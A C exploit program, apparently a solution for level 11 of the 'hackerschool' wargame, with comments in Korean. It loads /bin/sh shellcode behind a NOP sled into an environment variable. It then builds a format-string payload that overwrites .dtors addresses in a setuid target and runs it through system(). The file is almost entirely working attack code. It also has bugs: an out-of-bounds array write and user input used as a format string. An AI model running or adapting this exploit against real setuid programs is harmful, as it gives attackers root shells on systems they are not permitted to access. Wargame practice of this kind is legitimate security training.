/*
 * Author : superdk@hanmail.net
 * DATA : exploit code level11 of hackerschool
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define VICTIM					"/home/level11/attackme"
#define DEFAULT_OFFSET          0
#define DEFAULT_ADDR_SIZE		8
#define DEFAULT_BUFFER_SIZE     512
#define DEFAULT_SUPERDK_SIZE    2048
#define NOP       				0x90
#define HEX						16
#define FMTLEN					40

// 배시셸을 실행시키는 셸코드
char shellcode[] =
	"\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
	"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

// 스택포인터(SP) 를 가져오는 함수
unsigned long get_sp(void)
{
        __asm__("movl %esp, %eax");
}

// 소멸자의 메모리 주소
unsigned char retDtorB[] = "\\x10\\x96\\x04\\x08";
unsigned char retDtorF[] = "\\x12\\x96\\x04\\x08";

// 메모리에 있는 16진수 주소를 %정수c%n 의 정수 부분에 입력할 10진수로 바꿈
int hexToDec(char *ptrHex)
{
    char hexBuf[HEX];

    sprintf(hexBuf, ptrHex);

    return strtol(hexBuf, NULL, HEX);
}

int main(int argc, char **argv)
{
	char    *ptr, *superdk;
	char    shAddr[DEFAULT_ADDR_SIZE + 1];
	char    cmdBuf[DEFAULT_BUFFER_SIZE];
	long    *addr_ptr, addr;
	int     offset=DEFAULT_OFFSET;
	int     i, superdksize=DEFAULT_SUPERDK_SIZE;
	int     chgDec[3];

	// 셸코드를 올릴 포인터 주소에 동적 메모리 할당
	if ( !(superdk = malloc(superdksize)))
	{
		printf("Can't allocate memory for superdksize");
		exit(0);
	}

	// 셸코드의 주소 읽어와서 화면에 출력
	addr = get_sp() - offset;
	printf("Using address: 0x%x\n", addr);
	sprintf(shAddr, "%x", addr);

	
	// 셸코드 실행 확률을 높이기 위해서, 셸코드 앞에 충분한 NOP 추가
	ptr = superdk;
	for(i = 0; i < superdksize - strlen(shellcode) - 1; i++)
		*(ptr++) = NOP;

	// NOP 뒤에 셸코드 추가
	for(i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];

	// 배열의 끝을 명확히 알려주기 위해 문자열의 끝 표시
	superdk[superdksize - 1] = '\0';

	// SUPERDK 라는 환경변수명으로 셸코드를 환경 변수에 등록
	memcpy(superdk, "SUPERDK=", DEFAULT_ADDR_SIZE);
	putenv(superdk);

	// %정수c%n 의 정수값을 계산
	chgDec[0] = hexToDec(argv[2]);
	chgDec[1] = hexToDec(argv[3]);
	chgDec[3] = chgDec[0] - FMTLEN;

	if(chgDec[0] > chgDec[1])
	{
		chgDec[1] += hexToDec("10000");
		chgDec[1] = chgDec[1] - chgDec[0];
	}

	// 명령어 완성
	sprintf(cmdBuf, "%s $(printf \"AAAA%sAAAA%s\")%%8x%%8x%%8x%%%dc%%n%%%dc%%n", VICTIM, retDtorB, retDtorF, chgDec[3], chgDec[1]);
	
	// 완성된 명령어 실행
	system(cmdBuf);
}
